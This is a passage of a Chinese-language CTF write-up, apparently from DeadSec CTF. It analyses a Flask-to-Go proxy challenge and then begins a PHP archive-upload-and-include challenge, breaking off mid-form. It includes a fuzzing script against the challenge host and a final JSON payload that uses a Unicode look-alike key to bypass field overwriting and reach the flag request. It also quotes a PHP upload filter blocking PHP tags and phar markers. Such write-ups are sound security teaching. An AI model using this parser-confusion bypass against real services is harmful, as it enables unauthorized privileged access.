class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> RequestBody <span class="keyword">struct</span> &#123;</span><br><span class="line">    Username <span class="type">string</span>      <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">    Password <span class="keyword">interface</span>&#123;&#125; <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StringRequestBody <span class="keyword">struct</span> &#123;</span><br><span class="line">    Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">    Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    reqBody1 := RequestBody&#123;Password: math.NaN()&#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;interface&#123;&#125; NaN: %t\n&quot;</span>, reqBody1.Password != reqBody1.Password)</span><br><span class="line">    </span><br><span class="line">    reqBody2 := StringRequestBody&#123;Password: <span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;string type: %t\n&quot;</span>, reqBody2.Password != reqBody2.Password)</span><br><span class="line">    </span><br><span class="line">    nan := math.NaN()</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Direct NaN != NaN: %t\n&quot;</span>, nan != nan)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试了一下，发现确实不对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS F:\Download\go-fish\go-fish&gt; go run &quot;f:\Download\go-fish\go-fish\1.go&quot;</span><br><span class="line">interface&#123;&#125; NaN: true</span><br><span class="line">string type: false</span><br><span class="line">Direct NaN != NaN: true</span><br></pre></td></tr></table></figure><p>刚好这里是字符串，我嘞个大纲啊，所以现在只能想办法走私了，不过貌似这里也不叫走私，算是一个解析错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">GO_SERVER_URL = <span class="string">&quot;http://go_server:8080/go&quot;</span></span><br><span class="line">ADMIN_TOKEN = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>(<span class="params">data: <span class="built_in">dict</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        go_response = requests.post(GO_SERVER_URL, json=data, headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;response&quot;</span> : go_response.text&#125;)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Could not connect to backend server&quot;</span>&#125;), <span class="number">503</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Internal backend error&quot;</span>&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    logger.info(<span class="string">f&quot;Incoming request: <span class="subst">&#123;request.method&#125;</span> <span class="subst">&#123;request.url&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_json:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid JSON in request body&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    data = &#123;k.lower():v <span class="keyword">for</span> k,v <span class="keyword">in</span> data.items()&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&quot;username&quot;</span> <span class="keyword">in</span> data <span class="keyword">and</span> <span class="string">&quot;password&quot;</span> <span class="keyword">in</span> data):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Missing username and/or password&quot;</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    data |= &#123;<span class="string">&quot;request&quot;</span> : <span class="string">&quot;login&quot;</span>, <span class="string">&quot;token&quot;</span> : ADMIN_TOKEN&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proxy(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_json:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid JSON in request body&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> secrets.compare_digest(data.get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>), ADMIN_TOKEN):</span><br><span class="line">        data = &#123;k.lower():v <span class="keyword">for</span> k,v <span class="keyword">in</span> data.items()&#125;</span><br><span class="line">        data |= &#123;<span class="string">&quot;request&quot;</span> : <span class="string">&quot;givemeflagpls&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> proxy(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Wrong admin token&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>他使用python作为一层代理，对内部的go进行请求转发，每次都会有<code>|=</code>，而对于这里，我们就要想办法动动手脚，首先我们知道json有个覆盖值的解析问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">json_string = <span class="string">&#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;password&quot;:&quot;admin123&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json_string)</span><br><span class="line"></span><br><span class="line">parsed = json.loads(json_string)</span><br><span class="line"><span class="built_in">print</span>(parsed)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/golang/go/issues/53267">https://github.com/golang/go/issues/53267</a> 由于<code>ioutil.ReadAll</code>已经被弃用，所以这go版本肯定不会太高。</p><p>我们可以注意到这个issue主要提及的就是Unicode字符的安全问题，但是对于这里而言，标签又都是正常的</p><p>我们注意到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转换已知字段</span></span><br><span class="line">data = &#123;k.lower():v <span class="keyword">for</span> k,v <span class="keyword">in</span> data.items()&#125;  </span><br><span class="line"><span class="comment"># 覆盖已知字段</span></span><br><span class="line">data |= &#123;<span class="string">&quot;request&quot;</span>: <span class="string">&quot;login&quot;</span>, <span class="string">&quot;token&quot;</span>: ADMIN_TOKEN&#125; </span><br></pre></td></tr></table></figure><p>现在进行fuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">SERVER = <span class="string">&quot;c8ee4f7956920b0f372cbefc.deadsec.quest&quot;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">content = <span class="string">r&#x27;&#x27;&#x27;&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;&#125;&#x27;&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Send content to server: <span class="subst">&#123;content&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    ssl_context = ssl.create_default_context()</span><br><span class="line">    ssl_context.check_hostname = <span class="literal">False</span></span><br><span class="line">    ssl_context.verify_mode = ssl.CERT_NONE</span><br><span class="line">    s = ssl_context.wrap_socket(s, server_hostname=SERVER)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to server...&quot;</span>)</span><br><span class="line">    s.connect((SERVER, PORT))</span><br><span class="line">    </span><br><span class="line">    content_len = <span class="built_in">len</span>(content)</span><br><span class="line">    s.send((</span><br><span class="line">      <span class="string">f&quot;POST /login HTTP/1.1\r\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;Host: <span class="subst">&#123;SERVER&#125;</span>\r\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;Content-Type: application/json\r\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;Content-Length: <span class="subst">&#123;content_len&#125;</span>\r\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;\r\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;<span class="subst">&#123;content&#125;</span>&quot;</span></span><br><span class="line">    ).encode(<span class="string">&quot;latin1&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    data = s.recv(<span class="number">4096</span>) + s.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> order <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="string">&quot;request&quot;</span>)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0100</span>, <span class="number">0x0200</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">                <span class="string">&quot;request&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            key = <span class="string">&quot;request&quot;</span></span><br><span class="line">            key = key[:order] + <span class="built_in">chr</span>(i) + key[order+<span class="number">1</span>:]</span><br><span class="line">            data[key] = <span class="string">&quot;givemeflagpls&quot;</span></span><br><span class="line">            res = connect(json.dumps(data))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response:<span class="subst">&#123;res&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;DEAD&#123;&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">                <span class="built_in">print</span>(key)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>最后的poc如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;reque\u017Ft&quot;</span><span class="punctuation">:</span><span class="string">&quot;givemeflagpls&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="baby-web（13-solves）"><a href="#baby-web（13-solves）" class="headerlink" title="baby-web（13 solves）"></a>baby-web（13 solves）</h2><p>一道php的题目，但是感觉非常的无懈可击</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>] = <span class="title function_ invoke__">random_bytes</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Nope :&lt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$include_url</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$SANDBOX</span> = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;supersafesalt!!!!@#$&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$SANDBOX</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$SANDBOX</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$include_url</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Nope :&lt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.(zip|bz2|gz|xz|7z)/i&quot;</span>, <span class="variable">$include_url</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Nope :&lt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$SANDBOX</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$include_url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是index.php，里面两个函数直接把include包含的内容写死了，所以绝无可能用伪协议去加载文件，同时发现有个<code>file_exists</code>，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>, <span class="string">&#x27;xz&#x27;</span>, <span class="string">&#x27;7z&#x27;</span>];</span><br><span class="line"><span class="variable">$allowed_mime_types</span> = [</span><br><span class="line">    <span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-bzip2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-xz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-7z-compressed&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$tempfile</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tempfile</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;PK&quot;</span>) !== <span class="literal">false</span> ||</span><br><span class="line">        <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$data</span>), <span class="string">&quot;&lt;?php&quot;</span>) !== <span class="literal">false</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>] = <span class="title function_ invoke__">random_bytes</span>(<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$SANDBOX</span> = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;supersafesalt!!!!@#$&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$SANDBOX</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$SANDBOX</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filter</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nope :&lt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// mimetype check</span></span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$mime_type</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime_type</span>, <span class="variable">$allowed_mime_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Nope :&lt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ext check</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Nope :&lt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;<span class="subst">$SANDBOX</span>/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;File upload success!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&#x27;multipart/form-data&#x27;</span> action=<span class="string">&#x27;upload.php&#x27;</span> method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&#x27;file&#x27;</span> name=<span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span 